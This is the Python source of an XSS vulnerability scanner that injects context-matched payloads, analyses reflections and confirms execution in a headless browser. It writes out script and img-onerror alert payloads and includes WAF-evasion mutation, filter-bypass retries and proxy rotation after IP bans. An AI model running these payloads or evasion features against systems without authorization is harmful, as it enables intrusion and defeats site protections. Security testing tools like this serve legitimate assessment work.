#!/usr/bin/env python3
"""xssforge - context-aware XSS scanner with execution proof.

Aims to go beyond single-purpose scanners by combining an HTML/JS context
tokenizer, differential reflection analysis, static DOM taint review, a headless
browser oracle, built-in and interactsh blind-XSS callbacks, a dynamic
WAF-evasion mutation engine, OpenAPI/Swagger import, authenticated crawling and
multi-location injection (query, form, JSON, multipart, headers, cookies, path
and fragment).
"""
import argparse
import atexit
import concurrent.futures
import json
import os
import re
import secrets
import signal
import sys
import threading
import time
import webbrowser
from dataclasses import dataclass, field
from http.cookiejar import MozillaCookieJar
from urllib.parse import urlparse, parse_qsl, urlencode

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

import payloads as P
import xf_browser
import xf_context
import xf_crawl
import xf_dom
import xf_interactsh
import xf_mutate
import xf_oob
import xf_openapi
import xf_points
import xf_report
import xf_waf
import xf_libscan
import xf_filter
import xf_gen
import xf_seed
import xf_advice
import xf_csti
import xf_csp
import xf_struct
import xf_inject
import xf_import
import xf_mass
import xf_evidence
import xf_session
import xf_ai
import xf_gadget
import xf_hunt
import xf_verify

RESET = "\033[0m"
COLORS = {"red": "\033[31m", "green": "\033[32m", "yellow": "\033[33m",
          "cyan": "\033[36m", "magenta": "\033[35m", "dim": "\033[2m",
          "bold": "\033[1m", "blue": "\033[34m"}
USE_COLOR = sys.stdout.isatty()
PRINT_LOCK = threading.Lock()


def c(text, color):
    if not USE_COLOR:
        return str(text)
    return COLORS.get(color, "") + str(text) + RESET


def emit(text=""):
    with PRINT_LOCK:
        print(text, flush=True)


BANNER = r"""
    ___    __    ___    __  ______    __ ______  _____ ____
   /   |  / /   /   |  /  |/  /   |  / //_/ __ \/ ___// __ \
  / /| | / /   / /| | / /|_/ / /| | / ,< / /_/ / __ \/ /_/ /
 / ___ |/ /___/ ___ |/ /  / / ___ |/ /| |\__, / /_/ /\__, /
/_/  |_/_____/_/  |_/_/  /_/_/  |_/_/ |_/____/\____//____/
"""


@dataclass
class Options:
    url: str = ""
    params: list = field(default_factory=list)
    data: str = ""
    method: str = ""
    cookie: str = ""
    cookie_file: str = ""
    headers: dict = field(default_factory=dict)
    timeout: float = 15.0
    delay: float = 0.10
    retries: int = 3
    threads: int = 8
    insecure: bool = False
    proxy: str = ""
    proxy_file: str = ""
    proxy_list: list = field(default_factory=list)
    crawl: bool = False
    crawl_depth: int = 2
    crawl_max_pages: int = 50
    crawl_subdomains: bool = False
    fragment: bool = False
    path: bool = False
    dom: bool = False
    dom_fuzz: bool = False
    browser: bool = False
    headed: bool = False
    show_on_confirm: bool = False
    save_poc: bool = False
    browser_max: int = 4
    browser_wait: float = 3.5
    browser_pool: int = 2
    blind: str = ""
    oob_port: int = 0
    oob_host: str = "127.0.0.1"
    oob_wait: float = 8.0
    interactsh: bool = False
    interactsh_server: str = ""
    interactsh_token: str = ""
    payload_limit: int = 300
    max_candidates: int = 500
    embed_shots: bool = True
    auto: bool = False
    auto_probes: int = 0
    auto_points: int = 3
    probe_chars: str = ""
    first_hit: bool = False
    first_hit_bases: int = 3
    first_hit_max: int = 30
    deep_bypass: bool = False
    bypass_max: int = 100
    bypass_time: float = 300.0
    bypass_seed: str = ""
    seed_payloads: int = 20
    web_refresh: bool = False
    exploit_out: str = ""
    payload_files: list = field(default_factory=list)
    encode: list = field(default_factory=list)
    encode_max: int = 4
    mutate: bool = True
    mutate_base: int = 4
    mutate_max: int = 24
    bypass: bool = True
    bypass_variants: int = 6
    openapi: str = ""
    login_url: str = ""
    login_data: str = ""
    login_json: str = ""
    login_method: str = "POST"
    output_dir: str = "xssforge-out"
    report: list = field(default_factory=lambda: ["json", "html", "md"])
    json_out: bool = False
    authorized: bool = False
    show_evidence: bool = False
    quiet: bool = False
    inject_headers: list = field(default_factory=list)
    inject_cookies: list = field(default_factory=list)
    stored_url: str = ""
    stored_urls: list = field(default_factory=list)
    stored_cleanup_url: str = ""
    csrf_url: str = ""
    only_poc: bool = False
    ai_fallback: bool = False
    ai_model: str = ""
    ai_count: int = 8
    libraries: dict = field(default_factory=dict)
    waf_min_confidence: int = 0
    hunt: bool = False
    libscan: bool = False
    hpp: bool = False
    hpp_parts: int = 3
    structural: bool = False
    structural_pad: int = 2048
    min_confidence: str = "low"
    header_sweep: bool = False
    cookie_sweep: bool = False
    param_mine: bool = False
    param_wordlist: str = ""
    param_mine_max: int = 20
    postman: str = ""
    har_file: str = ""
    mass_file: str = ""
    mass_state: str = "xssforge-mass.json"
    mass_resume: bool = False
    mass_baseline: bool = False
    mass_dry_run: bool = False
    mass_limit: int = 0
    filter_profile: dict = field(default_factory=dict)
    csp_info: dict = field(default_factory=dict)
    evidence_max: int = 150
    dom_fallback: bool = False
    dom_form: str = ""
    dom_form_submit: str = ""
    scheme: str = "https"
    raw_request: str = ""
    raw_inject: bool = False
    state: str = ""
    user_agent: str = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
    follow: bool = True
    max_body: int = 4000000
    max_blocks: int = 12
    block_cooldown: float = 0.0
    ban_wait: float = 0.0
    dump_generated: str = ""
    dump_count: int = 100


class BlockTracker:
    """Shared WAF/IP-block detection across scanner threads."""

    def __init__(self):
        import threading as _t
        self.lock = _t.Lock()
        self.count = 0
        self.events = []
        self.stop_event = None
        self.factory = None
        self.max_blocks = 12
        self.cooldown = 0.0
        self.ban_wait = 0.0
        self.url = ""
        self.warned = False
        self.aborted = False
        self.banned = False
        self.recoveries = 0

    def note(self, status, url, count=True):
        with self.lock:
            if count:
                self.count += 1
            if len(self.events) < 20:
                self.events.append({"status": status, "url": str(url)[:300]})
            if not count:
                # payload-triggered WAF reject: note it in events but do not
                # let it abort or rotate (escalation must still get to run)
                return
            first = not self.warned
            self.warned = True
            hit_limit = bool(self.max_blocks and self.count >= self.max_blocks)
            recover = hit_limit and self.ban_wait > 0 and self.recoveries < 3 \
                and self.factory is not None and len(self.factory.proxies) > 1
            if hit_limit and not recover:
                self.aborted = True
                self.banned = True
                if self.stop_event is not None:
                    self.stop_event.set()
        if first:
            emit(c("! WAF/IP block detected (HTTP %s) — consider lowering "
                   "--threads, raising --delay, using --proxy-file to rotate, "
                   "or --max-blocks to stop automatically" % status, "red"))
        if hit_limit and recover:
            with self.lock:
                self.recoveries += 1
                self.count = 0
                self.warned = False
            emit(c("! URL/IP appears banned (HTTP %s) — waiting %.0fs, then "
                   "rotating proxy (recovery %d/3)" %
                   (status, self.ban_wait, self.recoveries), "red"))
            time.sleep(self.ban_wait)
            self.factory.rotate()
        elif not hit_limit:
            if self.factory is not None:
                self.factory.rotate()
            if self.cooldown:
                time.sleep(self.cooldown)


_BLOCKS = BlockTracker()
_INTERRUPT = threading.Event()


def _handle_interrupt(_signum, _frame):
    _INTERRUPT.set()
    emit(c("\n! interrupted — stopping after in-flight requests", "yellow"))


class RateLimiter:
    """Per-thread delay so --threads actually parallelises requests."""

    def __init__(self, delay):
        self.delay = max(0.0, float(delay))
        self.local = threading.local()

    @property
    def penalty(self):
        return getattr(self.local, "penalty", 0.0)

    def penalize(self, factor=2.0, cap=30.0):
        self.local.penalty = min(cap, max(self.delay, self.penalty * factor,
                                          self.delay * factor))

    def relax(self):
        self.local.penalty = max(0.0, self.penalty / 2.0)

    def wait(self):
        if self.delay <= 0 and self.penalty <= 0:
            return
        now = time.time()
        next_at = getattr(self.local, "next_at", 0.0)
        if now < next_at:
            time.sleep(next_at - now)
            now = time.time()
        self.local.next_at = now + self.delay + self.penalty


class SessionFactory:
    def __init__(self, opts):
        self.opts = opts
        self.local = threading.local()
        self.proxies = list(getattr(opts, "proxy_list", None) or
                            ([opts.proxy] if opts.proxy else []))
        self.proxy_index = 0
        self.lock = threading.Lock()
        self.request_count = 0

    def rotate(self):
        if len(self.proxies) < 2:
            return False
        with self.lock:
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
            idx = self.proxy_index
        emit(c("proxy   : rotating to #%d/%d %s" %
               (idx + 1, len(self.proxies), self.proxies[idx]), "magenta"))
        return True

    def current_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            return self.proxies[self.proxy_index]

    def get(self):
        idx = self.proxy_index
        s = getattr(self.local, "session", None)
        if s is None or getattr(self.local, "proxy_index", None) != idx:
            s = self._build(self.current_proxy())
            self.local.session = s
            self.local.proxy_index = idx
        return s

    def _build(self, proxy=None):
        s = requests.Session()
        h = {"User-Agent": self.opts.user_agent,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9",
             "Connection": "close"}
        h.update(self.opts.headers)
        if self.opts.cookie:
            h["Cookie"] = self.opts.cookie
        s.headers.update(h)
        # Retries are owned by send() so the attempt budget is bounded in one
        # place; urllib3-level retries would multiply it (retries^2).
        retry = Retry(total=0, backoff_factor=0.2)
        ad = HTTPAdapter(max_retries=retry, pool_connections=32, pool_maxsize=32)
        s.mount("http://", ad)
        s.mount("https://", ad)
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}
        if self.opts.cookie_file:
            _load_netscape_into(s, self.opts.cookie_file)
        if self.opts.login_url:
            _perform_login(s, self.opts)
        return s


def _perform_login(session, opts):
    """Authenticate the session once so crawling/scanning stay logged in."""
    kwargs = {"method": (opts.login_method or "POST").upper(),
              "url": opts.login_url, "timeout": opts.timeout,
              "verify": not opts.insecure, "allow_redirects": True}
    if opts.login_json:
        try:
            kwargs["json"] = json.loads(opts.login_json)
        except Exception:
            kwargs["data"] = opts.login_json
    elif opts.login_data:
        kwargs["data"] = dict(parse_qsl(opts.login_data, keep_blank_values=True))
    try:
        session.request(**kwargs)
    except Exception:
        pass


def _load_netscape_into(session, path):
    if not os.path.exists(path):
        return
    try:
        jar = MozillaCookieJar(path)
        jar.load(ignore_discard=True, ignore_expires=True)
        pairs = []
        for ck in jar:
            pairs.append("%s=%s" % (ck.name, ck.value))
            if re.fullmatch(r"\d+\.\d+\.\d+\.\d+", ck.domain or ""):
                ck.domain = "." + ck.domain
            session.cookies.set_cookie(ck)
        # http.cookiejar often refuses to send cookies with a bare-IP domain
        # (common in local labs: 127.0.0.1 / 192.168.x.x). A literal Cookie
        # header guarantees the session reaches the target.
        if pairs:
            session.headers["Cookie"] = "; ".join(pairs)
    except Exception:
        pass


def _transient_request_error(exc):
    low = str(exc).lower()
    return any(k in low for k in ("502", "503", "504", "timed out", "timeout",
                                  "connection", "proxy", "reset", "temporarily"))


def send(factory, limiter, point, value, opts, allow_redirects=None, count_block=True):
    kwargs, _ = xf_points.build_request(point, value, opts)
    kwargs["allow_redirects"] = opts.follow if allow_redirects is None else allow_redirects
    attempts = max(1, int(getattr(opts, "retries", 3)))
    for attempt in range(attempts):
        limiter.wait()
        try:
            if opts.raw_inject and point.location == "query":
                r = xf_points.raw_request(kwargs, opts.user_agent, opts.timeout,
                                          opts.max_body)
            else:
                r = factory.get().request(**kwargs)
            if hasattr(factory, "request_count"):
                with factory.lock:
                    factory.request_count += 1
            if len(r.content or b"") > opts.max_body:
                r._content = r.content[:opts.max_body]
            status = getattr(r, "status_code", 0)
            if status in (502, 503, 504) and attempt + 1 < attempts:
                emit(c("    ~ retry %d/%d after HTTP %d" %
                       (attempt + 1, attempts - 1, status), "yellow"))
                time.sleep(0.5 * (attempt + 1))
                continue
            if status == 429:
                limiter.penalize()
            elif status < 400:
                good = getattr(limiter.local, "good", 0) + 1
                limiter.local.good = good
                if good >= 20:
                    limiter.relax()
                    limiter.local.good = 0
            if _looks_blocked(r):
                # Payload attempts commonly trip WAF rules — expected, and it
                # must NOT exhaust the abort budget before escalation runs.
                _BLOCKS.note(status, kwargs.get("url", ""), count=count_block)
            return r
        except requests.RequestException as e:
            if hasattr(factory, "request_count"):
                with factory.lock:
                    factory.request_count += 1
            if attempt + 1 < attempts and _transient_request_error(e):
                emit(c("    ~ retry %d/%d after %s" %
                       (attempt + 1, attempts - 1, str(e)[:100]), "yellow"))
                time.sleep(0.5 * (attempt + 1))
                continue
            return e


def build_headers(opts):
    return {"User-Agent": opts.user_agent}


def _peak_memory_mb():
    try:
        import resource
        rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        return round(rss / (1048576.0 if sys.platform == "darwin" else 1024.0), 1)
    except Exception:
        return None


_VERIFIER_LOCK = threading.Lock()


def payload_block_count(state):
    """WAF/filter blocks seen on payload attempts (tracked outside _BLOCKS)."""
    return int((state.get("blocked") or [0])[0])


def _verify_call(opts, state, call):
    """Run the browser oracle with explicit state handling; never crash a scan."""
    browser = state.get("browser")
    if not getattr(opts, "browser", False):
        vr = {"hit": False, "state": xf_verify.VERIFIER_DISABLED,
              "detail": "browser verification disabled (--browser not requested)"}
    elif browser is None or not getattr(browser, "available", False):
        vr = {"hit": False, "state": xf_verify.VERIFIER_UNAVAILABLE,
              "detail": "browser verification unavailable: %s" %
                        (getattr(browser, "error", None) or "oracle not started")}
    else:
        try:
            vr = call(browser)
        except Exception as e:
            vr = {"hit": False, "state": xf_verify.VERIFIER_FAILED, "error": True,
                  "detail": "browser verifier exception: %s" % str(e)[:180]}
    vr = dict(vr or {})
    vstate = vr.get("state") or xf_verify.VERIFIER_COMPLETED
    with _VERIFIER_LOCK:
        info = state.get("browser_verifier") or xf_verify.verifier_status(
            browser, requested=getattr(opts, "browser", False))
        info["state"] = vstate
        info["counts"] = dict(info.get("counts") or {})
        info["counts"][vstate] = info["counts"].get(vstate, 0) + 1
        info["last_detail"] = str(vr.get("detail") or "")[:240]
        info["updated"] = xf_verify._now()
        state["browser_verifier"] = info
    return vr


def browser_verify(point, value, token, shot, opts, state, **kwargs):
    return _verify_call(
        opts, state,
        lambda b: b.verify(point, value, token, shot, **kwargs))


def browser_verify_form(url, field, value, submit, token, shot, opts, state):
    return _verify_call(
        opts, state,
        lambda b: b.verify_form(url, field, value, submit, token, shot))


def set_verification(entry, vr):
    """Record an honest per-finding verification state and its evidence."""
    if vr and vr.get("hit"):
        entry.update(xf_verify.finding(
            xf_verify.FINDING_CONFIRMED,
            reason=str(vr.get("detail") or "browser execution proof")[:300],
            evidence=vr.get("evidence")))
    else:
        entry.update(xf_verify.finding(
            xf_verify.FINDING_NOT_VERIFIED,
            reason=str((vr or {}).get("detail") or "no canary execution observed")[:300]))
    return entry


# ---------------------------------------------------------------------------
# Payload selection
# ---------------------------------------------------------------------------

def _context_categories(ctx):
    context = ctx.get("context") or "html"
    cats = list(P.CONTEXT_CATEGORIES.get(context, ["html"]))
    if context == "url":
        q = ctx.get("quote")
        attr_cat = (["attr_dq"] if q == '"' else
                    ["attr_sq"] if q == "'" else ["attr_unquoted"])
        passive_tags = ("img", "audio", "video", "source", "track", "input")
        if (ctx.get("tag") or "") in passive_tags:
            cats = attr_cat + ["url", "corpus_url"]
        else:
            cats = ["url", "corpus_url"] + attr_cat
        cats += ["encoding", "waf", "polyglot"]
    elif context == "script_string":
        cats = ["script", "encoding", "waf"]
    elif context == "attr_name":
        cats = ["attr_dq", "attr_sq", "attr_unquoted", "waf", "firewall"]
    if ctx.get("in_svg") and "svg" not in cats:
        cats = ["svg"] + cats
    if ctx.get("attr_event") and "script" not in cats:
        cats = ["script"] + cats
    return cats


def gather_payloads(ctx, opts, csp=None):
    cats = _context_categories(ctx)
    prof = getattr(opts, "filter_profile", None) or {}
    csp = csp if csp is not None else getattr(opts, "csp_info", None)
    if csp and csp.get("present"):
        cats = xf_csp.adapt_categories(cats, csp)
    blocked_chars = xf_filter.blocked_chars(prof) if prof else set()
    corpus = []
    seen = set()
    for cat in cats:
        for name, payload in P.PAYLOADS.get(cat, []):
            if payload in seen:
                continue
            seen.add(payload)
            corpus.append((cat + ":" + name, payload))
    # Library-aware gadgets jump the queue once libscan/sniffing identified a
    # vulnerable runtime (jQuery/AngularJS/DOMPurify/...). Insert before the
    # blocked-character filter so they obey the same constraints.
    libs = getattr(opts, "libraries", None) or {}
    if libs:
        for name, payload in xf_gadget.gadgets_for("", libs=libs):
            if blocked_chars and any(ch in payload for ch in blocked_chars):
                continue
            if payload not in seen:
                seen.add(payload)
                corpus.insert(0, (name, payload))
    if blocked_chars:
        usable = [it for it in corpus if not any(ch in it[1] for ch in blocked_chars)]
        if usable:
            corpus = usable
    if csp and csp.get("present"):
        corpus.sort(key=lambda item: -xf_csp.payload_score(item[1], csp))
    items = []
    if getattr(opts, "raw_inject", False):
        raw_universal = (
            '"><script>alert("__M__")</script>',
            "'><script>alert('__M__')</script>",
            '--><img src=x onerror=alert("__M__")>',
            '</title><script>alert("__M__")</script>',
            '"></textarea><script>alert("__M__")</script>',
        )
        items = [("raw-universal:%d" % i, p)
                 for i, p in enumerate(raw_universal)]
    custom = []
    custom_seen = set()
    for path in opts.payload_files:
        if not os.path.exists(path):
            continue
        with open(path, encoding="utf-8", errors="replace") as f:
            for i, line in enumerate(f):
                line = line.rstrip("\n")
                p = line.strip()
                # User payloads are always tested, even if the bundled corpus
                # happens to contain the same vector.
                if p and p not in custom_seen:
                    custom_seen.add(p)
                    seen.add(p)
                    custom.append(("custom:%d" % i, p))
    # User-supplied payloads are tested first and never truncated by the limit.
    if context_is_executable(ctx):
        execs = [it for it in corpus if P.looks_executable(it[1])]
        rest = [it for it in corpus if not P.looks_executable(it[1])]
        if opts.payload_limit:
            execs = execs[:opts.payload_limit]
            rest = rest[:max(0, opts.payload_limit // 4)]
        items = items + custom + execs + rest
    elif opts.payload_limit:
        items = items + custom + corpus[:opts.payload_limit]
    else:
        items = items + custom + corpus
    return items



def context_is_executable(ctx):
    return ctx and ctx.get("context") in (
        "html", "attr_dq", "attr_sq", "attr_unquoted", "script",
        "script_string", "url", "svg", "mxss", "rcdata", "css", "comment", "text")


# ---------------------------------------------------------------------------
# Analysis
# ---------------------------------------------------------------------------

def analyze_reflection(body, payload, token):
    if not body:
        return None
    probe = token if token and token in payload else payload
    if not probe:
        return None
    offs = xf_context.reflection_offsets(body, probe)
    raw = payload in body
    enc = xf_context.response_encoding_hint(body, payload, probe)
    return {"token_count": len(offs), "raw": raw, "encoding": enc}


def _payload_fits_context(payload, ctx):
    """Rough check that a payload can plausibly execute in this context.

    Prevents non-executable vectors (e.g. ``';alert()//`` injected as HTML text)
    from being reported as high-confidence reflections.
    """
    low = payload.lower()
    context = (ctx or {}).get("context") or "html"
    has_angle = "<" in payload
    has_handler = bool(re.search(r"\bon[a-z]+\s*=", low))
    has_scheme = "javascript:" in low
    has_script = "<script" in low
    if context in ("html", "text", "rcdata", "corpus_html", "json"):
        return has_angle and (has_script or has_handler or has_scheme
                              or "<svg" in low or "<img" in low
                              or "<iframe" in low or "<object" in low
                              or "<math" in low or "<details" in low)
    if context in ("attr_dq", "attr_sq", "attr_unquoted", "attr_name"):
        return has_angle or has_handler or has_scheme or payload[:1] in "'\""
    if context == "script_string":
        return ("</script" in low or "${" in payload or "\\u" in low
                or any(ch in payload for ch in "'\"`+;"))
    if context == "script":
        return True
    if context == "url":
        return has_scheme or has_angle or has_handler
    if context == "comment":
        return "-->" in payload or "--!>" in payload
    if context == "css":
        return "</style" in low or "expression" in low or "url(" in low
    if context == "svg":
        return has_angle and (has_handler or has_scheme)
    if context == "mxss":
        return has_angle
    return P.looks_executable(payload)


def score_candidate(payload, ctx, reflection):
    enc = reflection.get("encoding")
    raw = reflection.get("raw")
    fits = _payload_fits_context(payload, ctx)
    base = 0
    if raw:
        base = 80 if (P.looks_executable(payload) and fits) else 25
    elif enc in ("mutated", "html-encoded-then-decoded"):
        base = 55 if (P.looks_executable(payload) and fits) else 15
    elif enc in ("html-entity-escaped", "tag-stripped"):
        base = 10
    if ctx and ctx.get("context") == "script_string" and "alert(" in payload:
        base = max(base, 70 if fits else 45)
    return min(base, 90)


def save_evidence(opts, point, label, payload, token, resp, extra=""):
    host = re.sub(r"[^A-Za-z0-9._-]+", "_", urlparse(point.url).netloc or "target")[:80]
    d = os.path.join(opts.output_dir, host)
    os.makedirs(d, exist_ok=True)
    base = re.sub(r"[^A-Za-z0-9._-]+", "_", "%s_%s_%s" % (point.location, point.name, label))[:140]
    path = os.path.join(d, base + ".txt")
    body = getattr(resp, "text", "") or ""
    head = ("HTTP %s\nURL: %s\nLOCATION: %s\nPARAM: %s\nPAYLOAD: %s\nTOKEN: %s\n%s\n" %
            (getattr(resp, "status_code", "?"), getattr(resp, "url", point.url),
             point.location, point.name, payload, token, extra))
    with open(path, "w", encoding="utf-8", errors="replace") as f:
        f.write(head + body[:200000])
    return path


def screenshot_path(opts, point, label):
    host = re.sub(r"[^A-Za-z0-9._-]+", "_", urlparse(point.url).netloc or "target")[:80]
    d = os.path.join(opts.output_dir, host, "screens")
    os.makedirs(d, exist_ok=True)
    base = re.sub(r"[^A-Za-z0-9._-]+", "_", "%s_%s_%s" % (point.location, point.name, label))[:120]
    return os.path.join(d, base + ".png")


_NON_HTML_TYPES = ("text/plain", "text/csv", "text/x-csv", "application/pdf",
                   "application/octet-stream", "application/zip",
                   "application/x-tar", "application/gzip")
_NON_HTML_PREFIXES = ("image/", "audio/", "video/")


def _non_executable_content_type(ctype):
    """True when the response body can never execute markup/JS as XSS.

    A raw reflection in ``text/plain`` (APIs that echo input, logs, downloads)
    is a false positive: browsers render it as inert text, not HTML. Only skip
    the unambiguously non-renderable types; JSON/JS stay testable (JSONP, etc.).
    """
    ctype = (ctype or "").split(";", 1)[0].strip().lower()
    if not ctype:
        return False
    return ctype in _NON_HTML_TYPES or ctype.startswith(_NON_HTML_PREFIXES)


def _looks_blocked(resp):
    try:
        if getattr(resp, "status_code", 0) in (403, 406, 429, 501, 503):
            return True
    except Exception:
        return False
    body = (getattr(resp, "text", "") or "")[:6000].lower()
    markers = ("access denied", "request blocked", "blocked by",
               "web application firewall", "security policy",
               "suspicious activity", "not acceptable",
               "attention required", "challenge required")
    if any(m in body for m in markers):
        return True
    # "captcha" on its own is far too broad: ordinary pages mention it in menus
    # and docs (e.g. DVWA's "Insecure CAPTCHA" link). Only treat it as a block
    # when paired with an actual challenge phrase.
    captcha_markers = ("captcha required", "solve the captcha",
                       "complete the captcha", "please solve the captcha",
                       "verify you are human", "recaptcha challenge",
                       "enter the captcha", "captcha verification")
    if any(m in body for m in captcha_markers):
        return True
    # JS-challenge / interstitial pages echo the requested URL (incl. canary)
    # but are not real reflections — don't let them appear as injection points.
    return xf_waf.is_challenge(getattr(resp, "text", "") or "",
                               getattr(resp, "status_code", 200))


def _note_browser_issue(vr, state, entry):
    """Record WAF/bot challenge or driver failure so proof is not trusted."""
    if vr.get("blocked"):
        state.setdefault("browser_blocked", [0])[0] += 1
        entry["detail"] += "; BROWSER BLOCKED: %s" % vr.get("reason", "challenge")
        if not state.get("_block_reported"):
            state["_block_reported"] = True
            emit(c("    [BROWSER BLOCKED] %s — challenge page detected; "
                   "proof unreliable" % vr.get("reason", "challenge"), "red"))
        return True
    if vr.get("error"):
        state.setdefault("browser_error", [0])[0] += 1
        entry["detail"] += "; browser error: %s" % str(vr.get("detail", ""))[:80]
        return True
    if vr.get("syntax_error"):
        state.setdefault("syntax_error", [0])[0] += 1
        entry["confidence"] = max(int(entry.get("confidence") or 0), 70)
        entry["detail"] += "; SCRIPT EXECUTED BUT MANGLED (SyntaxError) — " \
                           "try noquote-* encoders / — encode quotes"
    return False


def _show_confirm(point, value, opts):
    """Open a visible browser at the confirmed proof URL so the user can see
    the alert and click OK. Uses the system default browser (or Chrome binary
    detected by xf_browser) via webbrowser; non-blocking."""
    try:
        kwargs, display = xf_points.build_request(point, value, opts)
        url = kwargs.get("url") or point.url
        emit(c("\n>>> CONFIRMED — opening visible browser: %s" % url[:160], "green"))
        emit(c("    (click OK on the alert, then close the window)", "dim"))
        webbrowser.open(url, new=1)
    except Exception as e:
        emit(c("    ! could not open visible browser: %s" % str(e)[:120], "yellow"))


def _save_poc(opts, point, name, value, resp, ctx):
    """Write a standalone HTML file that recreates the raw reflected response
    with the exact delivered payload, so it can be opened locally to see the
    alert without needing the live target or a display on the scan host."""
    try:
        host = re.sub(r"[^A-Za-z0-9._-]+", "_", urlparse(point.url).netloc or "target")[:80]
        d = os.path.join(opts.output_dir, host, "poc")
        os.makedirs(d, exist_ok=True)
        base = re.sub(r"[^A-Za-z0-9._-]+", "_",
                      "%s_%s_%s" % (point.location, point.name, name))[:120]
        path = os.path.join(d, base + ".html")
        body = getattr(resp, "text", "") or ""
        # Strip scripts from the captured page that would interfere, but keep
        # the reflected payload markup so the injection context is preserved.
        body = re.sub(r"<script[^>]*src=[^>]*></script>", "", body, flags=re.I)
        html = ("<!DOCTYPE html>\n<!-- xssforge standalone PoC -->\n"
                "<!-- point: %s  param: %s -->\n"
                "<!-- delivered payload: %s -->\n"
                "<!-- context: %s -->\n%s\n"
                % (point.url, point.name, value.replace("-->", "-- >"),
                   (ctx or {}).get("context"), body))
        with open(path, "w", encoding="utf-8", errors="replace") as f:
            f.write(html)
        emit(c("    [POC] %s" % path, "green"))
        return path
    except Exception as e:
        emit(c("    ! could not save PoC: %s" % str(e)[:120], "yellow"))
        return ""


def _quote_mangled(body, token):
    """True if the canary's surrounding quotes were backslash/entity-escaped.

    Servers running addslashes()/htmlspecialchars() turn alert('TOK') into
    alert(\\'TOK\\') / alert(&#39;TOK&#39;) — a SyntaxError, even though the
    tags themselves survive. Such reflections are still exploitable with a
    quote-less canary (alert(/TOK/) or alert(`TOK`)).
    """
    if not body or not token:
        return False
    pos = body.find(token)
    if pos < 0:
        return False
    pre = body[max(0, pos - 12):pos]
    post = body[pos + len(token):pos + len(token) + 12]
    around = pre + post
    return ("\\'" in around or '\\"' in around
            or "&#x27;" in around or "&#39;" in around
            or "&quot;" in around or "&#x22;" in around)


def _noquote_retry(point, value, token, opts, state, shot):
    """Re-verify a quote-mangled payload with quote-less canary literals."""
    for style in ("regex", "template"):
        nv = P.canaryize_noquote(value, token, style)
        if nv == value or token not in nv:
            continue
        if state["bcount"][0] >= opts.browser_max:
            return None, None
        state["bcount"][0] += 1
        vr = browser_verify(point, nv, token, shot, opts, state)
        if vr.get("hit"):
            return nv, vr
    return None, None


def test_payload(ctx, point, name, raw_payload, opts, state):
    token = state["token"]
    value = P.canaryize(raw_payload, token)
    resp = send(state["factory"], state["limiter"], point, value, opts, count_block=False)
    if isinstance(resp, Exception):
        return None
    body = resp.text or ""
    probe = token if token in value else value
    if not probe or probe not in body:
        if _looks_blocked(resp):
            state["blocked"][0] += 1
        return None
    reflection = analyze_reflection(body, value, probe)
    if not reflection:
        return None
    score = score_candidate(value, ctx, reflection)
    if score < 40:
        return None
    entry = {
        "name": name,
        "payload": raw_payload,
        "value": value,
        "context": (ctx or {}).get("context"),
        "reflection": reflection,
        "status": "LIKELY" if score >= 55 else "REFLECTED",
        "confidence": score,
        "detail": "%s reflection (%s)" % (reflection.get("encoding"), (ctx or {}).get("context")),
        "url": xf_points.build_request(point, value, opts)[1],
        "body": "",
        "curl": xf_points.curl_repro(point, value, opts),
        "evidence": "",
        "screenshot": "",
    }
    if point.location in ("json", "graphql", "xml", "form", "multipart",
                          "multipart-filename", "header"):
        entry["body"] = _body_preview(point, value, opts)
    # Only persist responses for plausible findings, with a global cap, so a
    # 1000-payload run does not fill the disk and freeze the desktop.
    if score >= 55 and state["ecount"][0] < getattr(opts, "evidence_max", 150):
        state["ecount"][0] += 1
        entry["evidence"] = save_evidence(opts, point, name, value, token, resp)
    # execution oracle
    can_verify = token in value
    if not (opts.browser and can_verify and state.get("browser")
            and state.get("browser").available):
        reason = ("--browser not requested" if not opts.browser else
                  "browser verification unavailable: %s" %
                  (getattr(state.get("browser"), "error", None) or "oracle not started"))
        set_verification(entry, {"hit": False, "detail": reason})
    if (opts.browser and can_verify and state.get("browser")
            and state.get("browser").available and state["bcount"][0] < opts.browser_max):
        state["bcount"][0] += 1
        shot = screenshot_path(opts, point, name)
        vr = browser_verify(point, value, token, shot, opts, state)
        _note_browser_issue(vr, state, entry)
        set_verification(entry, vr)
        if vr.get("hit"):
            entry["status"] = "CONFIRMED"
            entry["confidence"] = 95
            entry["detail"] = vr.get("detail")
            entry["screenshot"] = shot
            if getattr(opts, "save_poc", False):
                entry["poc"] = _save_poc(opts, point, name, value, resp, ctx)
            if getattr(opts, "show_on_confirm", False):
                _show_confirm(point, value, opts)
            return entry, True
        if vr.get("detail"):
            entry["detail"] += "; browser: " + vr["detail"][:120]
        # Auto-escalate quote-mangled reflections: retry a quote-less canary so
        # an exploitable target is reported as CONFIRMED, not left as LIKELY.
        if vr.get("syntax_error") or _quote_mangled(body, token):
            nv, nvr = _noquote_retry(point, value, token, opts, state, shot)
            if nvr and nvr.get("hit"):
                entry.update({
                    "value": nv,
                    "status": "CONFIRMED",
                    "confidence": 95,
                    "detail": "quote-mangled reflection; quote-less canary "
                              "executed: " + str(nvr.get("detail", ""))[:120],
                    "screenshot": shot,
                    "url": xf_points.build_request(point, nv, opts)[1],
                    "curl": xf_points.curl_repro(point, nv, opts),
                })
                set_verification(entry, nvr)
                if getattr(opts, "show_on_confirm", False):
                    _show_confirm(point, nv, opts)
                return entry, True
    return entry, False


def _body_preview(point, value, opts):
    kwargs, _ = xf_points.build_request(point, value, opts)
    if kwargs.get("json") is not None:
        return json.dumps(kwargs["json"])
    if kwargs.get("data"):
        return str(kwargs["data"])[:2000]
    return ""


def _scan_fragment(point, opts, state, result):
    """Fragment/DOM testing happens in the browser, never on the server."""
    token = state["token"]
    if not (opts.browser and state.get("browser") and state.get("browser").available):
        result["notes"].append("fragment point requires --browser (client-side only)")
        return result
    items = []
    for cat in ("dom", "polyglot", "html"):
        items.extend(P.PAYLOADS.get(cat, []))
    seen = set()
    for name, payload in items:
        if payload in seen:
            continue
        seen.add(payload)
